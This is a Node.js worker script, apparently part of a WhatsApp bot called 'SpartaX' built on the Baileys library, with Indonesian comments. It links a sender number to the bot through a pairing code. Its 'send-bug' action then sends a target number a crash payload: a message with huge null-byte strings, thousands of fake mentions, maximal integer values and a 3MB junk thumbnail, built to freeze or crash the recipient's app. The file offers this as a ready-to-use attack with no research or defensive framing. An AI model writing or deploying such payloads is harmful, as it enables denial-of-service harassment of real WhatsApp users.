const { parentPort, workerData } = require("worker_threads");
const path = require("path");
const fs = require("fs");

async function main() {
    const { number, authDir, action = "pairing" } = workerData || {};

    if (action === "pairing") {
        if (!number || !authDir) return parentPort.postMessage({ ok: false, error: "missing data" });
        if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

        let baileys;
        try {
            baileys = require("@whiskeysockets/baileys");
        } catch (e) {
            return parentPort.postMessage({ ok: false, error: "baileys require: " + e.message });
        }

        const makeWASocket = baileys.default || baileys.makeWASocket;
        const useMultiFileAuthState = baileys.useMultiFileAuthState;
        const DisconnectReason = baileys.DisconnectReason;
        const Browsers = baileys.Browsers;
        const fetchLatestBaileysVersion = baileys.fetchLatestBaileysVersion;

        let version = [2, 3000, 1015901307];
        try {
            if (typeof fetchLatestBaileysVersion === "function") {
                const v = await fetchLatestBaileysVersion();
                if (v && v.version) version = v.version;
            }
        } catch {}

        let browser = ["SpartaX", "Chrome", "1.0.0"];
        try {
            if (Browsers && typeof Browsers.ubuntu === "function") browser = Browsers.ubuntu("Chrome");
        } catch {}

        const { state, saveCreds } = await useMultiFileAuthState(authDir);

        let sock;
        try {
            sock = makeWASocket({
                version,
                auth: state,
                printQRInTerminal: false,
                browser,
                logger: require("pino")({ level: "silent" }),
                generateHighQualityLinkPreview: false,
                syncFullHistory: false,
                markOnlineOnConnect: false,
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 2000
            });
        } catch (e) {
            return parentPort.postMessage({ ok: false, error: "makeWASocket: " + e.message });
        }

        sock.ev.on("creds.update", saveCreds);

        // Reconnect otomatis kalau 515
        sock.ev.on("connection.update", async (u) => {
            if (u.connection === "close") {
                const code = u.lastDisconnect?.error?.output?.statusCode;
                const reason = u.lastDisconnect?.error?.message || "unknown";
                parentPort.postMessage({ ok: true, phase: "closed", code, reason });
                if (code === 515) {
                    // stream error — restart
                    try {
                        parentPort.postMessage({ ok: true, phase: "restart" });
                    } catch {}
                }
            }
            if (u.connection === "open") {
                parentPort.postMessage({ ok: true, phase: "connected" });
            }
        });

        await new Promise(r => setTimeout(r, 2000));

        // Request pairing code
        let pairingCode = null;
        let attempts = 0;
        const maxAttempts = 5;

        while (attempts < maxAttempts && !pairingCode) {
            attempts++;
            try {
                pairingCode = await sock.requestPairingCode(number);
                if (pairingCode && typeof pairingCode === "string" && pairingCode.length >= 6) {
                    break;
                } else {
                    pairingCode = null;
                }
            } catch (e) {
                parentPort.postMessage({ ok: true, phase: "pairing_attempt", attempt: attempts, error: e.message });
                await new Promise(r => setTimeout(r, 5000));
            }
        }

        if (!pairingCode) {
            try { sock.end(undefined); } catch {}
            return parentPort.postMessage({ ok: false, error: "gagal request pairing code setelah " + attempts + " percobaan" });
        }

        // Kirim pairing code ke parent
        parentPort.postMessage({ ok: true, phase: "pairing", code: pairingCode });

        // Tunggu connect
        const connected = await new Promise((resolve) => {
            const t = setTimeout(() => resolve(false), 10 * 60 * 1000); // 10 menit
            sock.ev.on("connection.update", (u) => {
                if (u.connection === "open") {
                    clearTimeout(t);
                    resolve(true);
                }
            });
        });

        if (connected) {
            parentPort.postMessage({ ok: true, phase: "success" });
            // Keep worker alive biar bot tau
            await new Promise(r => setTimeout(r, 600000)); // 10 menit
        } else {
            try { sock.end(undefined); } catch {}
            parentPort.postMessage({ ok: false, error: "ga connect dalam 10 menit" });
        }

        return;
    }

    if (action === "send-bug") {
        const { senderNumber, target, pairingDir } = workerData;
        if (!senderNumber || !target || !pairingDir) {
            return parentPort.postMessage({ ok: false, error: "missing data" });
        }

        const authDir = path.join(pairingDir, senderNumber);
        if (!fs.existsSync(authDir)) {
            return parentPort.postMessage({ ok: false, error: "sender auth ga ada" });
        }

        let baileys;
        try {
            baileys = require("@whiskeysockets/baileys");
        } catch (e) {
            return parentPort.postMessage({ ok: false, error: "baileys require: " + e.message });
        }

        const makeWASocket = baileys.default || baileys.makeWASocket;
        const useMultiFileAuthState = baileys.useMultiFileAuthState;

        const { state, saveCreds } = await useMultiFileAuthState(authDir);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            browser: ["SpartaX", "Chrome", "1.0.0"],
            logger: require("pino")({ level: "silent" }),
            connectTimeoutMs: 30000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 15000
        });

        sock.ev.on("creds.update", saveCreds);

        const connected = await new Promise((resolve) => {
            const t = setTimeout(() => resolve(false), 20000);
            sock.ev.on("connection.update", (u) => {
                if (u.connection === "open") { clearTimeout(t); resolve(true); }
                if (u.connection === "close") { clearTimeout(t); resolve(false); }
            });
        });

        if (!connected) {
            try { sock.end(undefined); } catch {}
            return parentPort.postMessage({ ok: false, error: "ga connect ke WA" });
        }

        try {
            const crypto = require("crypto");
            const hex = () => crypto.randomBytes(16).toString("hex");
            const jid = `${target}@s.whatsapp.net`;
            const payload = {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveResponseMessage: {
                            body: { text: "\u0000\u0001\u0002\u0003".repeat(80000) },
                            nativeFlowResponseMessage: {
                                name: "\u0000ExoidFc",
                                paramsJson: "\u0000".repeat(90000),
                                version: 4294967295
                            },
                            contextInfo: {
                                mentionedJid: Array.from({ length: 3000 }, () => `${hex()}@s.whatsapp.net`),
                                forwardingScore: 999999,
                                isForwarded: true,
                                externalAdReply: {
                                    title: "\u0000".repeat(60000),
                                    body: "\u0000".repeat(60000),
                                    mediaType: 4294967295,
                                    mediaUrl: "\u0000".repeat(60000),
                                    sourceUrl: "\u0000".repeat(60000),
                                    thumbnail: Buffer.alloc(1024 * 1024 * 3, 0xff),
                                    renderLargerThumbnail: true,
                                    showAdAttribution: true
                                }
                            }
                        }
                    }
                }
            };
            await sock.relayMessage(jid, payload, { messageId: hex().toUpperCase(), participant: { jid } });
            try { sock.end(undefined); } catch {}
            parentPort.postMessage({ ok: true });
        } catch (e) {
            try { sock.end(undefined); } catch {}
            parentPort.postMessage({ ok: false, error: "relayMessage: " + e.message });
        }
        return;
    }

    parentPort.postMessage({ ok: false, error: "action tidak dikenal" });
}

main().catch((e) => {
    try { parentPort.postMessage({ ok: false, error: "fatal: " + e.message }); } catch {}
});